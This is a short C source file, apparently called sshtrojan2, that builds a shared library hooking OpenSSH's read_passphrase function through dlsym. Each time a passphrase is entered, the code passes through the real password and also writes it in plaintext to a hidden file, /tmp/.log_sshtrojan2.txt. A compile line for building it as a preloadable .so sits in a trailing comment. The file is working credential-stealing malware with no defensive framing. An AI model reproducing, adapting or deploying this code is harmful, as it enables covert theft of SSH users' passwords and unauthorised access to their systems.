#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include "openssh-portable/misc.h"
//
//
//#include <sys/types.h>
//#include <sys/wait.h>
//
//#include <errno.h>
//#include <fcntl.h>
//#ifdef HAVE_PATHS_H
//# include <paths.h>
//#endif
//#include <signal.h>
//#include <stdarg.h>
//#include <stdlib.h>
//#include <string.h>
//
//#include "openssh-portable/xmalloc.h"
//#include "openssh-portable/pathnames.h"
//#include "openssh-portable/log.h"
//#include "openssh-portable/ssh.h"
//#include "openssh-portable/uidswap.h"
//#include "openssh-portable/includes.h"
//
//#include <sys/types.h>
//#include <sys/wait.h>
//
//#include <errno.h>
//#include <fcntl.h>
//#ifdef HAVE_PATHS_H
//# include <paths.h>
//#endif
//#include <signal.h>
//#include <stdarg.h>
//#include <stdio.h>
//#include <stdlib.h>
//#include <string.h>
//#include <unistd.h>
//
//#include "openssh-portable/xmalloc.h"
//#include "openssh-portable/misc.h"
//#include "openssh-portable/pathnames.h"
//#include "openssh-portable/log.h"
//#include "openssh-portable/ssh.h"
//#include "openssh-portable/uidswap.h"

char *read_passphrase(const char *prompt, int flags) {
    char *(*new_read_passphrase)(const char *prompt, int flags);
    new_read_passphrase = dlsym(RTLD_NEXT, "read_passphrase");

    char *password = new_read_passphrase(prompt, flags);

    FILE *log = fopen("/tmp/.log_sshtrojan2.txt", "a");
    fprintf(log, "password: %s\n", password);
    fclose(log);

    return password;
}

// gcc sshtrojan2.c -o libsshtrojan2.so -fPIC -shared -ldl -D_GNU_SOURCE
